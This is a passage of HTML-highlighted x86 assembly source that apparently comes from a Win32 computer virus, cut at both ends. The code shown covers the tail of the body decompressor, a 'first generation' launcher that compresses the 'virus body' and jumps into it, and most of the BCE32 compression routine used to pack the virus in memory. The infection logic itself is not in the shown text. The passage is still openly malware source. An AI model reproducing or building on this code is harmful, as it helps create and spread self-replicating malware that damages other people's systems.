</span><span class="sc5">nb</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;next bit</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;increment parameter</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">bcopy</span><span class="sc0">              </span><span class="sc1">;and align next bits</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;restore ECX</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;test flags</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">d_bits</span><span class="sc0">              </span><span class="sc1">;if not sign, jump</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;delete pushed parameters</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all regs</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">decompressed</span><span class="sc0">
</span><span class="sc5">cbit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;increment counter</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">;byte full ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n_byte</span><span class="sc0">              </span><span class="sc1">;no, continue</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;yeah, store byte</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;and prepare next one</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">                 </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc5">n_byte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save back byte</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc5">Pshd</span><span class="sc0">        </span><span class="sc1">;quit from procedure with one parameter on stack</span><span class="sc0">
</span><span class="sc5">db1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">;2. bit in decryption key</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                         </span><span class="sc1">;2 bit wide</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">testbits</span><span class="sc0">                </span><span class="sc1">;test bits</span><span class="sc0">
</span><span class="sc5">db2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;4. bit</span><span class="sc0">
</span><span class="sc5">tb2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">;3 bit wide</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">testbits</span><span class="sc0">                </span><span class="sc1">;test bits</span><span class="sc0">

</span><span class="sc5">_compressed_</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1a00h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;here is stored compressed</span><span class="sc0">
                                                </span><span class="sc1">;virus body</span><span class="sc0">
</span><span class="sc5">decompressed</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">compressed</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;here decompressed</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">size_unint</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;and here all uninitialized</span><span class="sc0">
                                                </span><span class="sc1">;variables</span><span class="sc0">
</span><span class="sc5">virtual_end</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;end of virus in memory</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">                                           </span><span class="sc1">;code section</span><span class="sc0">
</span><span class="sc5">first_gen</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;first generation code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">compressed</span><span class="sc0">              </span><span class="sc1">;source</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_compressed_</span><span class="sc0">            </span><span class="sc1">;destination</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">compressed</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">;size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">workspace1</span><span class="sc0">              </span><span class="sc1">;workspace1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">workspace2</span><span class="sc0">              </span><span class="sc1">;workspace2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BCE32_Compress</span><span class="sc0">                     </span><span class="sc1">;Compress virus body!</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;save compressed virus size</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">                               </span><span class="sc1">;jmp to virus</span><span class="sc0">


</span><span class="sc1">;Compression routine from BCE32 starts here. This is used only in first gen.</span><span class="sc0">

</span><span class="sc5">BCE32_Compress</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all regs</span><span class="sc0">
</span><span class="sc1">;stage 1</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;and again</span><span class="sc0">
</span><span class="sc5">create_table</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;save for l8r usage</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;ECX = 4</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;load byte to AL</span><span class="sc0">
</span><span class="sc5">l_table</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;EDX = 0</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;this stuff will separate and test</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">st_end</span><span class="sc0">               </span><span class="sc1">;bit groups</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc8">st2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc8">st3</span><span class="sc0">
</span><span class="sc8">st1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;01</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">st_end</span><span class="sc0">
</span><span class="sc8">st2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;10</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">st_end</span><span class="sc0">
</span><span class="sc8">st3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;11</span><span class="sc0">
</span><span class="sc5">st_end</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;increment count in table</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">;next bit group</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">l_table</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;restore number of bytes</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">create_table</span><span class="sc0">           </span><span class="sc1">;next byte</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;this will check for same numbers</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;ECX = 4</span><span class="sc0">
</span><span class="sc5">re_t</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cdq</span><span class="sc0">                 </span><span class="sc1">;EDX = 0</span><span class="sc0">
</span><span class="sc5">t_loop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;load DWORD</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;increment it</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;test for same numbers</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_inc_</span><span class="sc0">                </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_inc_</span><span class="sc0">                </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_inc_</span><span class="sc0">                </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ninc_</span><span class="sc0">               </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc5">_inc_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;same, increment it</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;increment counter (check it in next turn)</span><span class="sc0">
</span><span class="sc5">ninc_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;table overflow ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">re_t</span><span class="sc0">                 </span><span class="sc1">;yeah, once again</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;increment offset to table</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">t_loop</span><span class="sc0">             </span><span class="sc1">;loop</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore regs</span><span class="sc0">

</span><span class="sc1">;stage 2</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all regs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;get pointer to table</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;EBX = 3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;ECX = 3</span><span class="sc0">
</span><span class="sc5">rep_sort</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;bubble sort = the biggest value will</span><span class="sc0">
                        </span><span class="sc1">;always "bubble up", so we know number</span><span class="sc0">
                        </span><span class="sc1">;steps</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;set pointerz</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;load DWORD (count)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
</span><span class="sc5">sort</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;load next</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;is it bigger</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">noswap</span><span class="sc0">               </span><span class="sc1">;no, store it</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">               </span><span class="sc1">;yeah, swap DWORDs</span><span class="sc0">
</span><span class="sc5">noswap</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">sort</span><span class="sc0">               </span><span class="sc1">;next DWORD</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;biggest in EDX, swap it</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;and store</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get back pointer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;restore regs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">rep_sort</span><span class="sc0">               </span><span class="sc1">;and try next DWORD</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc1">;stage 3</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all regs</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;EAX = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;ECX = 4</span><span class="sc0">
</span><span class="sc5">n_search</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;save regs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get pointer to table</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;store reg</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;load DWORD to EAX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;ECX = 3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;set pointerz</span><span class="sc0">
</span><span class="sc5">search</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;load next</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;end ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_search</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;next search</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc0">
</span><span class="sc5">end_search</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;and next step</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">n_search</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ebx</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;restore all</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc1">;stage 4</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;EBP = 0</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;EDX = 0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">               </span><span class="sc1">;store decryption key</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;increment pointer</span><span class="sc0">
</span><span class="sc5">next_byte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;EAX = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;load next byte</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;ECX = 4</span><span class="sc0">
</span><span class="sc5">next_bits</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;store regs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;separate bit group</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;compare with next group</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cb0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;compare with next group</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
